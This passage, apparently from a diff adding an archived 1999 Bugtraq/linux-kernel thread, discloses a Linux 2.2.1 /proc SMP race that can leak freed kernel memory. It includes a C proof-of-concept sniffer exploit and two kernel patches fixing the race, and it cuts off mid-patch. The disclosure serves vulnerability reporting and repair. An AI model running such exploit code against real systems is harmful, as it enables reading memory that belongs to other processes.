+    memory. The memory that could be sniffed could contain any kind of useful
+    data (userspace process memory, cache or whatever). It's not possible to
+    grab the whole page but it's possible only to reproduce the contents of
+    the memory reading and decoding the output of /proc.
+    
+    Maybe it's impossible to exploit the SMP race I am pointing out even if on
+    3way smp because of timing issues, but there's no a lock that assures
+    atomicity.
+    
+    Side note: I hope to have diffed all the interesting changes from my tree
+    to 2.2.1 at the end of the email (I don't have the time to check). If for
+    some reason the patch won't apply cleanly or will not work don't bother me
+    in mass, but instead go in sync with my personal kernel tree to get this
+    race fixed (I take it open just to allow other people to try it) at
+    ftp://e-mind.com/pub/linux/arca-tree/2.2.1_arca-2.gz. My tree has also
+    many other improvements, bugfix and features (not only developed by me,
+    e.g.  the ieee1284-parport code developed by Tim Waugth) and can have any
+    kind of bugs in it so ask me before use it for production (so I'll tell
+    you what you have to remove to get it rock solid for sure).
+    
+    Andrea Arcangeli
+    
+    ---------- Forwarded message ----------
+    Date: Tue, 2 Feb 1999 01:07:07 +0100 (CET)
+    >From: Andrea Arcangeli <andrea@e-mind.com>
+    To: linux-kernel@vger.rutgers.edu
+    Subject: [patch] /proc race fixes for 2.2.1
+    
+    2.2.1 reintroduced a SMP race in array.c. The SMP race is that wait(2) can
+    free the kernel stack of the zombie process while array.c is using it.
+    
+    Once the page is freed it can be reused, and if it get recycled before
+    array.c has finished to use it, you could reconstruct part of RAM that you
+    should not be allowed to read (looking at /proc data) and array.c could
+    get in problems during its lifetime (not checked this last but it's a
+    guess).
+    
+    In practice the window for the race is small and I think you would need at
+    least 3 CPU to reproduce this I think.
+    
+    The first CPU has to fork a process that will do only an _exit(2). Then
+    has to wait that the forked process become a zombie, and once it's a
+    zombie it has to start a /proc sniffer that will read /proc/zombiepid/stat
+    on the other cpu.
+    
+    This sniffer will save its contents to a buffer at the first pass and then
+    it will start reading /proc/../stat in loop and comparing it with the one
+    saved in the buffer, and it will then log the output of /proc/../stat if
+    it will be changed compared with the saved data sample in the buffer.
+    
+    Once the sniffer is at regime (the loop that search for /proc changes is
+    started) the task on the first CPU (the one that forked the sniffer) has
+    to do a wait(2) so that the stack of the zombie process will be released.
+    
+    A bit before doing the wait(2) you must eat all the memory avaliable with
+    a trashing proggy and this last has to run in a new CPU (so you need at
+    least a 3way smp). Since this last memory-trasher proggy will start
+    allocing tons of memory, you'll have a chance that the pages freed by
+    wait(2) will be realloced by the kernel before the read of the /proc
+    sniffer will finish.
+    
+    It's theorically possible to sniff data from the kernel exploiting the
+    /proc race but it's really hard and only on some very parallel hardware.
+    
+    I also written a sample of exploit (really ugly, I written it very fast
+    and without thinking too much about it because I think to spend better my
+    time in fixing the bug or writing useful code than in writing exploits....
+    and because I realizied that on the hardware I have here it would have
+    never worked ;).
+    
+    /*
+     * Copyright (C) 1999  Andrea Arcangeli
+     * Linux-2.2.1 /proc SMP race sniffer
+     */
+    
+    #include <stdio.h>
+    #include <fcntl.h>
+    #include <sched.h>
+    #include <pthread.h>
+    
+    static volatile int pid = -1;
+    static int prog_length;
+    static pthread_mutex_t pid_lock = PTHREAD_MUTEX_INITIALIZER;
+    static pthread_mutex_t zombie_lock = PTHREAD_MUTEX_INITIALIZER;
+    
+    static int get_current_pid(void)
+    {
+            int __pid;
+            pthread_mutex_lock(&pid_lock);
+            __pid = pid;
+            pthread_mutex_unlock(&pid_lock);
+            return __pid;
+    }
+    
+    static void * sniffer(void *dummy)
+    {
+            int cache_pid = -1, fd = -1;
+            char str[50], buf[2000], sample[2000];
+    
+            pthread_mutex_lock(&zombie_lock);
+            pthread_mutex_unlock(&zombie_lock);
+    
+            for (;;)
+            {
+                    int length_cmp;
+                    if (get_current_pid() != cache_pid)
+                    {
+                            pthread_mutex_lock(&zombie_lock);
+                            cache_pid = pid;
+                            snprintf(str, 50, "/proc/%d/stat", cache_pid);
+                            if (fd > 0)
+                                    close(fd);
+                            fd = open(str, O_RDONLY|O_NONBLOCK);
+                            if (fd > 0)
+                            {
+                                    int length;
+                                    length = read(fd, &buf, 2000);
+                                    if (length > 0)
+                                    {
+                                            length_cmp = length;
+                                            memcpy(sample, buf, length);
+                                            sample[length-1] = 0;
+                                    }
+                            }
+                            pthread_mutex_unlock(&zombie_lock);
+                    }
+    
+                    if (fd > 0)
+                    {
+                            int length;
+    
+                            lseek(fd, 0, SEEK_SET);
+                            length = read(fd, &buf, 200);
+                            buf[length-1] = 0;
+                            if (length >= length_cmp && memcmp(buf, sample,
+                                                               length_cmp))
+                                    printf("length %d, pid %d\n"
+                                           "original data: %s\n"
+                                           "modifyed data: %s\n",
+                                           length, cache_pid, sample, buf);
+                    }
+            }
+    }
+    
+    static int is_zombie(int __pid)
+    {
+            char str[50], state;
+            FILE * status;
+            snprintf(str, 50, "/proc/%d/status", __pid);
+            status = fopen(str, "r");
+            if (!status)
+            {
+                    perror("open");
+                    exit(2);
+            }
+            fscanf(status, "%*s\t%*s\nState:\t%c", &state);
+            fclose(status);
+            if (state != 'Z')
+                    return 0;
+            return 1;
+    }
+    
+    int main(int argc, char *argv[])
+    {
+            int dummy;
+            pthread_t task_struct_sniffer;
+    
+            pthread_mutex_lock(&zombie_lock);
+    
+            if (pthread_create(&task_struct_sniffer, NULL, sniffer, NULL))
+            {
+                    perror("pthread_create");
+                    exit(1);
+            }
+    
+            for (;;)
+            {
+                    int __pid = fork();
+                    if (!__pid)
+                            _exit(0);
+    
+                    while (!is_zombie(__pid));
+    
+                    pthread_mutex_lock(&pid_lock);
+                    pid = __pid;
+                    pthread_mutex_unlock(&pid_lock);
+    
+                    pthread_mutex_unlock(&zombie_lock);
+                    usleep(1);
+                    wait(&dummy);
+                    pthread_mutex_lock(&zombie_lock);
+            }
+            pthread_mutex_unlock(&zombie_lock);
+    }
+    
+    Probably it has also bugs (since I have no chance to make it working here
+    I am not going to look at it further), I attached it here only in the case
+    someone is interested on a exploit sample. BTW, is there a better way to
+    know when the child is become a zombie than reading
+    /proc/pidofchild/status ? I thought to catch the SIGCHILD signal but as
+    first I was not sure that this way a wait() would be wakenup anyway (too
+    lazy to check in signal.c ;), and as second with the /proc/xxx/status
+    approch I had to write less code anyway and since it was a not performance
+    critical piece of code I had no dubit of the way to take ;).
+    
+    I also understood very well the reason of the 2.2.0 oopses and process in
+    D state. It was happening something like this:
+    
+            `ps`                            tsk
+            -------------                   -----------------
+            sys_read()
+            lock_kernel()
+                                            do_page_fault()
+            array_read()
+                                            down(tsk->mm)
+                                            find_vma()
+            get_process_array()
+                                            handle_mm_fault()
+                                            lock_kernel() /* woowoo so spin on
+                                                            the big kernel
+                                                            lock */
+            get_stat()
+            grab_task()
+            down(tsk->mm) /* just owned by tsk */
+            schedule() /* so release the big kernel lock */
+                                            tsk gets the big kernel lock
+                                            here
+                                            finish the page fault
+                                            __up()
+                                            wake_up_process(`ps`)
+                                            many othe thing
+                                            execve() /* this is the harming */
+                                            mmput(tsk->mm);
+                                            tsk->mm = mm_alloc(); (mm->count = 1)
+                                            finish execve...
+                                            .... everything he wants ....
+            now `ps` get rescheduled
+            and own the mm->semaphore
+            (of a mm_struct that is not
+            tsk->mm anymore)
+            release_task(tsk);
+            mmput(tsk->mm); (but mm->count was 1!!)
+            exit_mmap();
+            zap_page_range() /* aieee! */
+                                            at the first fault it will get
+                                            a mm = &init_mm !!
+    
+    Thinks like this can't happens in 2.2.0-pre9 just because tsk->mm was
+    still referencing the old mm of the process (before the execve) because
+    tsk->mm was a copy and not a runtime value.
+    
+    Obviously there was the stack overflow and performances problem in the
+    (1) copy approch.
+    
+    So now I fixed all races with a zerocopy approch (originally suggested by
+    Linus that increments the page count of the process stack instead of
+    doing the copy, but it also assure that array.c always use the mm it has
+    get before (with mmget())).
+    
+    Works fine here. Patch against 2.2.1:
+    
+    --- /tmp/array.c        Tue Feb  2 00:08:07 1999
+    +++ linux/fs/proc/array.c       Mon Feb  1 23:51:51 1999
+    @@ -389 +390,30 @@
+    -static unsigned long get_phys_addr(struct task_struct * p, unsigned long ptr)
+    +/*
+    + * Caller must release_mm the mm_struct later.
+    + * You don't get any access to init_mm.
+    + */
+    +static struct mm_struct * grab_mm(int pid)
+    +{
+    +       struct mm_struct * mm = NULL;
+    +       struct task_struct * tsk;
+    +
+    +       read_lock(&tasklist_lock);
+    +       tsk = find_task_by_pid(pid);
+    +       /*
+    +        * NOTE: this doesn't race because we are protected by the
+    +        * big kernel lock. -arca
+    +        */
+    +       if (tsk && tsk->mm && tsk->mm != &init_mm)
+    +               mmget(mm = tsk->mm);
+    +       read_unlock(&tasklist_lock);
+    +       if (mm)
+    +               down(&mm->mmap_sem);
+    +       return mm;
+    +}
+    +
+    +static void release_mm(struct mm_struct *mm)
+    +{
+    +       up(&mm->mmap_sem);
+    +       mmput(mm);
+    +}
+    +
+    +static unsigned long get_phys_addr(struct mm_struct *mm, unsigned long ptr)
+    @@ -395 +425 @@
+    -       if (!p || !p->mm || ptr >= TASK_SIZE)
+    +       if (ptr >= TASK_SIZE)
+    @@ -398,2 +428,2 @@
+    -       if (!p->mm->pgd) {
+    -               printk("get_phys_addr: pid %d has NULL pgd!\n", p->pid);
+    +       if (!mm->pgd) {
+    +               printk(KERN_DEBUG "missing pgd for mm %p\n", mm);
+    @@ -403 +433 @@
+    -       page_dir = pgd_offset(p->mm,ptr);
+    +       page_dir = pgd_offset(mm,ptr);
+    @@ -425 +455 @@
+    -static int get_array(struct task_struct *p, unsigned long start, unsigned long end, char * buffer)
+    +static int get_array(struct mm_struct *mm, unsigned long start, unsigned long end, char * buffer)
+    @@ -434 +464 @@
+    -               addr = get_phys_addr(p, start);
+    +               addr = get_phys_addr(mm, start);
+    @@ -456,5 +486,2 @@
+    -       struct task_struct *p;
+    -       
+    -       read_lock(&tasklist_lock);
+    -       p = find_task_by_pid(pid);
+    -       read_unlock(&tasklist_lock);    /* FIXME!! This should be done after the last use */
+    +       struct mm_struct *mm;
+    +       int res = 0;
+    @@ -462,3 +489,6 @@
+    -       if (!p || !p->mm)
+    -               return 0;
+    -       return get_array(p, p->mm->env_start, p->mm->env_end, buffer);
+    +       mm = grab_mm(pid);
+    +       if (mm) {
+    +               res = get_array(mm, mm->env_start, mm->env_end, buffer);
+    +               release_mm(mm);
+    +       }
+    +       return res;
+    @@ -469 +499,2 @@
+    -       struct task_struct *p;
+    +       struct mm_struct *mm;
+    +       int res = 0;
+    @@ -471,6 +502,6 @@
+    -       read_lock(&tasklist_lock);
+    -       p = find_task_by_pid(pid);
+    -       read_unlock(&tasklist_lock);    /* FIXME!! This should be done after the last use */
+    -       if (!p || !p->mm)
+    -               return 0;
+    -       return get_array(p, p->mm->arg_start, p->mm->arg_end, buffer);
+    +       mm = grab_mm(pid);
+    +       if (mm) {
+    +               res = get_array(mm, mm->arg_start, mm->arg_end, buffer);
+    +               release_mm(mm);
+    +       }
+    +       return res;
+    @@ -725 +707 @@
+    -static inline char * task_mem(struct task_struct *p, char *buffer)
+    +static inline char * task_mem(struct mm_struct * mm, char *buffer)
+    @@ -727,4 +709,2 @@
+    -       struct mm_struct * mm = p->mm;
+    -
+    -       if (mm && mm != &init_mm) {
+    -               struct vm_area_struct * vma = mm->mmap;
+    +       if (mm) {
+    +               struct vm_area_struct * vma;
+    @@ -819,0 +800,39 @@
+    +static struct task_struct *grab_task(int pid, struct mm_struct ** mm)
+    +{
+    +       struct task_struct *tsk = current;
+    +       
+    +       *mm = NULL;
+    +       read_lock(&tasklist_lock);
+    +       tsk = find_task_by_pid(pid);
+    +       if (tsk)
+    +       {
+    +               struct mm_struct * __mm;
+    +               struct page * page = mem_map + MAP_NR(tsk);
+    +               atomic_inc(&page->count);
+    +               /*
+    +                * NOTE: this doesn't race because we are protected
+    +                * by the big kernel lock. -arca
+    +                */
+    +               __mm = tsk->mm;
+    +               if (__mm && __mm != &init_mm)
+    +               {
+    +                       mmget(__mm);
+    +                       *mm = __mm;
+    +               }
+    +       }
+    +       read_unlock(&tasklist_lock);
+    +       if (*mm)
+    +               down(&(*mm)->mmap_sem);
+    +
+    +       return tsk;
+    +}
+    +
+    +static void release_task(struct task_struct *tsk, struct mm_struct * mm)
+    +{
+    +       if (mm)
+    +       {
+    +               up(&mm->mmap_sem);
+    +               mmput(mm);
+    +       }
+    +       free_pages((unsigned long) tsk, 1);
+    +}
+    @@ -825,4 +844,3 @@
+    -
+    -       read_lock(&tasklist_lock);
+    -       tsk = find_task_by_pid(pid);
+    -       read_unlock(&tasklist_lock);    /* FIXME!! This should be done after the last use */
+    +       struct mm_struct * mm;
+    +       
+    +       tsk = grab_task(pid, &mm);
+    @@ -833 +851 @@
+    -       buffer = task_mem(tsk, buffer);
+    +       buffer = task_mem(mm, buffer);
+    @@ -835,0 +854 @@
+    +       release_task(tsk, mm);
+    @@ -841,0 +861 @@
+    +       struct mm_struct * mm;
+    @@ -846,0 +867 @@
+    +       int res;
+    @@ -848,3 +869 @@
+    -       read_lock(&tasklist_lock);
+    -       tsk = find_task_by_pid(pid);
+    -       read_unlock(&tasklist_lock);    /* FIXME!! This should be done after the last use */
+    +       tsk = grab_task(pid, &mm);
+    @@ -855,3 +874,4 @@
+    -       if (tsk->mm && tsk->mm != &init_mm) {
+    -               struct vm_area_struct *vma = tsk->mm->mmap;
+    -               while (vma) {
+    +       if (mm) {
+    +               struct vm_area_struct *vma;
+    +
+    +               for (vma = mm->mmap; vma; vma = vma->vm_next) {
+    @@ -859 +878,0 @@
+    -                       vma = vma->vm_next;
+    @@ -860,0 +880 @@
+    +               
+    @@ -881 +901 @@
+    -       return sprintf(buffer,"%d (%s) %c %d %d %d %d %d %lu %lu \
+    +       res = sprintf(buffer,"%d (%s) %c %d %d %d %d %d %lu %lu \
+    @@ -907 +927 @@
+    -               tsk->mm ? tsk->mm->rss : 0, /* you might want to shift this left 3 */
+    +               mm ? mm->rss : 0, /* you might want to shift this left 3 */
+    @@ -909,3 +929,3 @@
+    -               tsk->mm ? tsk->mm->start_code : 0,
+    -               tsk->mm ? tsk->mm->end_code : 0,
+    -               tsk->mm ? tsk->mm->start_stack : 0,
+    +               mm ? mm->start_code : 0,
+    +               mm ? mm->end_code : 0,
+    +               mm ? mm->start_stack : 0,
+    @@ -925,0 +946,3 @@
+    +
+    +       release_task(tsk, mm);
+    +       return res;
+    @@ -1003 +1025,0 @@
+    -       struct task_struct *tsk;
+    @@ -1004,0 +1027 @@
+    +       struct mm_struct *mm;
+    @@ -1006,7 +1029,3 @@
+    -       read_lock(&tasklist_lock);
+    -       tsk = find_task_by_pid(pid);
+    -       read_unlock(&tasklist_lock);    /* FIXME!! This should be done after the last use */
+    -       if (!tsk)
+    -               return 0;
+    -       if (tsk->mm && tsk->mm != &init_mm) {
+    -               struct vm_area_struct * vma = tsk->mm->mmap;
+    +       mm = grab_mm(pid);
+    +       if (mm) {
+    +               struct vm_area_struct * vma = mm->mmap;
+    @@ -1015 +1034 @@
+    -                       pgd_t *pgd = pgd_offset(tsk->mm, vma->vm_start);
+    +                       pgd_t *pgd = pgd_offset(mm, vma->vm_start);
+    @@ -1032,0 +1052 @@
+    +               release_mm(mm);
+    @@ -1070 +1089,0 @@
+    -
+    @@ -1074 +1093,2 @@
+    -       struct task_struct *p;
+    +       struct task_struct * p;
+    +       struct mm_struct * mm;
+    @@ -1079 +1098,0 @@
+    -       int volatile_task;
+    @@ -1091,3 +1110 @@
+    -       read_lock(&tasklist_lock);
+    -       p = find_task_by_pid(pid);
+    -       read_unlock(&tasklist_lock);    /* FIXME!! This should be done after the last use */
+    +       p = grab_task(pid, &mm);
+    @@ -1097 +1114 @@
+    -       if (!p->mm || p->mm == &init_mm || count == 0)
+    +       if (!mm || count == 0)
+    @@ -1100,3 +1116,0 @@
+    -       /* Check whether the mmaps could change if we sleep */
+    -       volatile_task = (p != current || atomic_read(&p->mm->count) > 1);
+    -
+    @@ -1108 +1122 @@
+    -       for (map = p->mm->mmap, i = 0; map && (i < lineno); map = map->vm_next, i++)
+    +       for (map = mm->mmap, i = 0; map && (i < lineno); map = map->vm_next, i++)
+    @@ -1179,6 +1192,0 @@
+    -
+    -               /* By writing to user space, we might have slept.
+    -                * Stop the loop, to avoid a race condition.
+    -                */
+    -               if (volatile_task)
+    -                       break;
+    @@ -1190,0 +1199 @@
+    +       release_task(p, mm);
+    @@ -1202 +1211,2 @@
+    -       struct task_struct * tsk = current ;
+    +       struct task_struct * tsk;
+    +       struct mm_struct * mm;
+    @@ -1205,6 +1215,2 @@
+    -       read_lock(&tasklist_lock);
+    -       if (pid != tsk->pid)
+    -               tsk = find_task_by_pid(pid);
+    -       read_unlock(&tasklist_lock);    /* FIXME!! This should be done after the last use */
+    -
+    -       if (tsk == NULL)
+    +       tsk = grab_task(pid, &mm);
+    +       if (!tsk)
+    @@ -1223,0 +1230 @@
+    +       release_task(tsk, mm);
+    
+    
+    Andrea Arcangeli
+    
+    
+    -
+    To unsubscribe from this list: send the line "unsubscribe linux-kernel" in
+    the body of a message to majordomo@vger.rutgers.edu
+    Please read the FAQ at http://www.tux.org/lkml/
+    
+    --------------------------------------------------------------------------------
+    
+    Date: Thu, 4 Feb 1999 15:09:06 +0100
+    From: Andrea Arcangeli <andrea@e-mind.com>
+    To: BUGTRAQ@netspace.org
+    Subject: Re: [patch] /proc race fixes for 2.2.1 (fwd)
+    
+    On Tue, 2 Feb 1999, Andrea Arcangeli wrote:
+    
+    > Side note: I hope to have diffed all the interesting changes from my tree
+    > to 2.2.1 at the end of the email (I don't have the time to check). If for
+    
+    Woops I had a bug in the patch. The bug is that when the task to grab is
+    the current one we must not get the mmap_semaphore otherwise we left a
+    window open for deadlocking on it.
+    
+    Here the fixed patch against 2.2.1 again.
+    
+    Index: array.c
+    ===================================================================
+    RCS file: /var/cvs/linux/fs/proc/array.c,v
+    retrieving revision 1.1.1.5
+    diff -u -r1.1.1.5 array.c
+    --- array.c     1999/01/29 14:50:53     1.1.1.5
+    +++ linux/fs/proc/array.c       1999/02/04 13:59:26
+    @@ -386,21 +386,57 @@
+            return sprintf(buffer, "%s\n", saved_command_line);
+     }
+    
+    -static unsigned long get_phys_addr(struct task_struct * p, unsigned long ptr)
+    +/*
+    + * Caller must release_mm the mm_struct later.
+    + * You don't get any access to init_mm.
+    + */
+    +static struct mm_struct * grab_mm(int pid)
+    +{
+    +       struct mm_struct * mm;
+    +       struct task_struct * tsk;
+    +
+    +       if (current->pid == pid)
+    +               return current->mm;
+    +
+    +       mm = NULL;
+    +       read_lock(&tasklist_lock);
+    +       tsk = find_task_by_pid(pid);
+    +       /*
+    +        * NOTE: this doesn't race because we are protected by the
+    +        * big kernel lock. -arca
+    +        */
+    +       if (tsk && tsk->mm && tsk->mm != &init_mm)
+    +               mmget(mm = tsk->mm);
+    +       read_unlock(&tasklist_lock);
+    +       if (mm)
+    +               down(&mm->mmap_sem);
+    +       return mm;
+    +}
+    +
+    +static void release_mm(struct mm_struct *mm)
+     {
+    +       if (current->mm != mm)
+    +       {
+    +               up(&mm->mmap_sem);
+    +               mmput(mm);
+    +       }
+    +}
+    +
+    +static unsigned long get_phys_addr(struct mm_struct *mm, unsigned long ptr)
+    +{
+            pgd_t *page_dir;
+            pmd_t *page_middle;
+            pte_t pte;
+    
+    -       if (!p || !p->mm || ptr >= TASK_SIZE)
+    +       if (ptr >= TASK_SIZE)
+                    return 0;
+            /* Check for NULL pgd .. shouldn't happen! */
+    -       if (!p->mm->pgd) {
+    -               printk("get_phys_addr: pid %d has NULL pgd!\n", p->pid);
+    +       if (!mm->pgd) {
+    +               printk(KERN_DEBUG "missing pgd for mm %p\n", mm);
+                    return 0;
+            }
+    
+    -       page_dir = pgd_offset(p->mm,ptr);
+    +       page_dir = pgd_offset(mm,ptr);
+            if (pgd_none(*page_dir))
+                    return 0;
+            if (pgd_bad(*page_dir)) {
+    @@ -422,7 +458,7 @@
+            return pte_page(pte) + (ptr & ~PAGE_MASK);
+     }
+    
+    -static int get_array(struct task_struct *p, unsigned long start, unsigned long end, char * buffer)
+    +static int get_array(struct mm_struct *mm, unsigned long start, unsigned long end, char * buffer)
+     {
+            unsigned long addr;
+            int size = 0, result = 0;
+    @@ -431,7 +467,7 @@
+            if (start >= end)
+                    return result;
+            for (;;) {
+    -               addr = get_phys_addr(p, start);
+    +               addr = get_phys_addr(mm, start);
+                    if (!addr)
+                            return result;
+                    do {
+    @@ -453,27 +489,28 @@
+    
+     static int get_env(int pid, char * buffer)
+     {
+    -       struct task_struct *p;
+    -       
+    -       read_lock(&tasklist_lock);
+    -       p = find_task_by_pid(pid);
+    -       read_unlock(&tasklist_lock);    /* FIXME!! This should be done after the last use */
+    +       struct mm_struct *mm;
+    +       int res = 0;
+    
+    -       if (!p || !p->mm)
+    -               return 0;
+    -       return get_array(p, p->mm->env_start, p->mm->env_end, buffer);
+    +       mm = grab_mm(pid);
+    +       if (mm) {
+    +               res = get_array(mm, mm->env_start, mm->env_end, buffer);
+    +               release_mm(mm);
+    +       }
+    +       return res;
+     }
+    
+     static int get_arg(int pid, char * buffer)
+     {
+    -       struct task_struct *p;
+    +       struct mm_struct *mm;
+    +       int res = 0;
+    
+    -       read_lock(&tasklist_lock);
+    -       p = find_task_by_pid(pid);
+    -       read_unlock(&tasklist_lock);    /* FIXME!! This should be done after the last use */
+    -       if (!p || !p->mm)
+    -               return 0;
+    -       return get_array(p, p->mm->arg_start, p->mm->arg_end, buffer);
+    +       mm = grab_mm(pid);
+    +       if (mm) {
+    +               res = get_array(mm, mm->arg_start, mm->arg_end, buffer);
+    +               release_mm(mm);
+    +       }
+    +       return res;
+     }
+    
+     /*
+    @@ -722,12 +759,10 @@
+            return buffer;
+     }
+    
+    -static inline char * task_mem(struct task_struct *p, char *buffer)
+    +static inline char * task_mem(struct mm_struct * mm, char *buffer)
+     {
+    -       struct mm_struct * mm = p->mm;
+    -
+    -       if (mm && mm != &init_mm) {
+    -               struct vm_area_struct * vma = mm->mmap;
+    +       if (mm) {
+    +               struct vm_area_struct * vma;
+                    unsigned long data = 0, stack = 0;
+                    unsigned long exec = 0, lib = 0;
+    
+    @@ -817,47 +852,96 @@
+                                cap_t(p->cap_effective));
+     }
+    
+    +static struct task_struct *grab_task(int pid, struct mm_struct ** mm)
+    +{
+    +       struct task_struct *tsk = current;
+    +       
+    +       if (current->pid == pid)
+    +       {
+    +               *mm = current->mm;
+    +               return current;
+    +       }
+    +
+    +       *mm = NULL;
+    +       read_lock(&tasklist_lock);
+    +       tsk = find_task_by_pid(pid);
+    +       if (tsk)
+    +       {
+    +               struct mm_struct * __mm;
+    +               struct page * page = mem_map + MAP_NR(tsk);
+    +               atomic_inc(&page->count);
+    +               /*
+    +                * NOTE: this doesn't race because we are protected
+    +                * by the big kernel lock. -arca
+    +                */
+    +               __mm = tsk->mm;
+    +               if (__mm && __mm != &init_mm)
+    +               {
+    +                       mmget(__mm);
+    +                       *mm = __mm;
+    +               }
+    +       }
+    +       read_unlock(&tasklist_lock);
+    +       if (*mm)
+    +               down(&(*mm)->mmap_sem);
+    +
+    +       return tsk;
+    +}
+    +
+    +static void release_task(struct task_struct *tsk, struct mm_struct * mm)
+    +{
+    +       if (current != tsk)
+    +       {
+    +               if (mm)
+    +               {
+    +                       up(&mm->mmap_sem);
+    +                       mmput(mm);
+    +               }
+    +               free_pages((unsigned long) tsk, 1);
+    +       }
+    +}
+    
+     static int get_status(int pid, char * buffer)
+     {
+            char * orig = buffer;
+            struct task_struct *tsk;
+    -
+    -       read_lock(&tasklist_lock);
+    -       tsk = find_task_by_pid(pid);
+    -       read_unlock(&tasklist_lock);    /* FIXME!! This should be done after the last use */
+    +       struct mm_struct * mm;
+    +       
+    +       tsk = grab_task(pid, &mm);
+            if (!tsk)
+                    return 0;
+            buffer = task_name(tsk, buffer);
+            buffer = task_state(tsk, buffer);
+    -       buffer = task_mem(tsk, buffer);
+    +       buffer = task_mem(mm, buffer);
+            buffer = task_sig(tsk, buffer);
+            buffer = task_cap(tsk, buffer);
+    +       release_task(tsk, mm);
+            return buffer - orig;
+     }
+    
+     static int get_stat(int pid, char * buffer)
+     {
+            struct task_struct *tsk;
+    +       struct mm_struct * mm;
+            unsigned long vsize, eip, esp, wchan;
+            long priority, nice;
+            int tty_pgrp;
+            sigset_t sigign, sigcatch;
+            char state;
+    +       int res;
+    
+    -       read_lock(&tasklist_lock);
+    -       tsk = find_task_by_pid(pid);
+    -       read_unlock(&tasklist_lock);    /* FIXME!! This should be done after the last use */
+    +       tsk = grab_task(pid, &mm);
+            if (!tsk)
+                    return 0;
+            state = *get_task_state(tsk);
+            vsize = eip = esp = 0;
+    -       if (tsk->mm && tsk->mm != &init_mm) {
+    -               struct vm_area_struct *vma = tsk->mm->mmap;
+    -               while (vma) {
+    +       if (mm) {
+    +               struct vm_area_struct *vma;
+    +
+    +               for (vma = mm->mmap; vma; vma = vma->vm_next) {
+                            vsize += vma->vm_end - vma->vm_start;
+    -                       vma = vma->vm_next;
+                    }
+    +               
+                    eip = KSTK_EIP(tsk);
+                    esp = KSTK_ESP(tsk);
+            }
+    @@ -878,7 +962,7 @@
+            nice = tsk->priority;
+            nice = 20 - (nice * 20 + DEF_PRIORITY / 2) / DEF_PRIORITY;
+    
+    -       return sprintf(buffer,"%d (%s) %c %d %d %d %d %d %lu %lu \
+    +       res = sprintf(buffer,"%d (%s) %c %d %d %d %d %d %lu %lu \
+     %lu %lu %lu %lu %lu %ld %ld %ld %ld %ld %ld %lu %lu %ld %lu %lu %lu %lu %lu \
+     %lu %lu %lu %lu %lu %lu %lu %lu %d\n",
+                    pid,
+    @@ -904,11 +988,11 @@
+                    tsk->it_real_value,
+                    tsk->start_time,
+                    vsize,
+    -               tsk->mm ? tsk->mm->rss : 0, /* you might want to shift this left 3 */
+    +               mm ? mm->rss : 0, /* you might want to shift this left 3 */
+                    tsk->rlim ? tsk->rlim[RLIMIT_RSS].rlim_cur : 0,
+    -               tsk->mm ? tsk->mm->start_code : 0,
+    -               tsk->mm ? tsk->mm->end_code : 0,
+    -               tsk->mm ? tsk->mm->start_stack : 0,
+    +               mm ? mm->start_code : 0,
+    +               mm ? mm->end_code : 0,
+    +               mm ? mm->start_stack : 0,
+                    esp,
+                    eip,
+                    /* The signal information here is obsolete.
+    @@ -923,6 +1007,9 @@
+                    tsk->nswap,
+                    tsk->cnswap,
+                    tsk->exit_signal);
+    +
+    +       release_task(tsk, mm);
+    +       return res;
+     }
+                    
+     static inline void statm_pte_range(pmd_t * pmd, unsigned long address, unsigned long size,
+    @@ -1000,19 +1087,15 @@
+    
+     static int get_statm(int pid, char * buffer)
+     {
+    -       struct task_struct *tsk;
+            int size=0, resident=0, share=0, trs=0, lrs=0, drs=0, dt=0;
+    +       struct mm_struct *mm;
+    
+    -       read_lock(&tasklist_lock);
+    -       tsk = find_task_by_pid(pid);
+    -       read_unlock(&tasklist_lock);    /* FIXME!! This should be done after the last use */
+    -       if (!tsk)
+    -               return 0;
+    -       if (tsk->mm && tsk->mm != &init_mm) {
+    -               struct vm_area_struct * vma = tsk->mm->mmap;
+    +       mm = grab_mm(pid);
+    +       if (mm) {
+    +               struct vm_area_struct * vma = mm->mmap;
+    
+                    while (vma) {
+    -                       pgd_t *pgd = pgd_offset(tsk->mm, vma->vm_start);
+    +                       pgd_t *pgd = pgd_offset(mm, vma->vm_start);
+                            int pages = 0, shared = 0, dirty = 0, total = 0;
+    
+                            statm_pgd_range(pgd, vma->vm_start, vma->vm_end, &pages, &shared, &dirty,
+    &total);
+    @@ -1030,6 +1113,7 @@
+                                    drs += pages;
+                            vma = vma->vm_next;
+                    }
+    +               release_mm(mm);
+            }
+            return sprintf(buffer,"%d %d %d %d %d %d %d\n",
+                           size, resident, share, trs, lrs, drs, dt);
+    @@ -1067,16 +1151,15 @@
+    
+     #define MAPS_LINE_MAX  MAPS_LINE_MAX8
+    
+    -
+     static ssize_t read_maps (int pid, struct file * file, char * buf,
+                              size_t count, loff_t *ppos)
+     {
+    -       struct task_struct *p;
+    +       struct task_struct * p;
+    +       struct mm_struct * mm;
+            struct vm_area_struct * map, * next;
+            char * destptr = buf, * buffer;
+            loff_t lineno;
+            ssize_t column, i;
+    -       int volatile_task;
+            long retval;
+    
+            /*
+    @@ -1088,24 +1171,19 @@
+                    goto out;
+    
+            retval = -EINVAL;
+    -       read_lock(&tasklist_lock);
+    -       p = find_task_by_pid(pid);
+    -       read_unlock(&tasklist_lock);    /* FIXME!! This should be done after the last use */
+    +       p = grab_task(pid, &mm);
+            if (!p)
+                    goto freepage_out;
+    
+    -       if (!p->mm || p->mm == &init_mm || count == 0)
+    +       if (!mm || count == 0)
+                    goto getlen_out;
+    
+    -       /* Check whether the mmaps could change if we sleep */
+    -       volatile_task = (p != current || atomic_read(&p->mm->count) > 1);
+    -
+            /* decode f_pos */
+            lineno = *ppos >> MAPS_LINE_SHIFT;
+            column = *ppos & (MAPS_LINE_LENGTH-1);
+    
+            /* quickly go to line lineno */
+    -       for (map = p->mm->mmap, i = 0; map && (i < lineno); map = map->vm_next, i++)
+    +       for (map = mm->mmap, i = 0; map && (i < lineno); map = map->vm_next, i++)
+                    continue;
+    
+            for ( ; map ; map = next ) {
+    @@ -1176,18 +1254,13 @@
+                    /* done? */
+                    if (count == 0)
+                            break;
+    -
+    -               /* By writing to user space, we might have slept.
+    -                * Stop the loop, to avoid a race condition.
+    -                */
+    -               if (volatile_task)
+    -                       break;
+            }
+    
+            /* encode f_pos */
+            *ppos = (lineno << MAPS_LINE_SHIFT) + column;
+    
+     getlen_out:
+    +       release_task(p, mm);
+            retval = destptr - buf;
+    
+     freepage_out:
+    @@ -1199,15 +1272,12 @@
+     #ifdef __SMP__
+     static int get_pidcpu(int pid, char * buffer)
+     {
+    -       struct task_struct * tsk = current ;
+    +       struct task_struct * tsk;
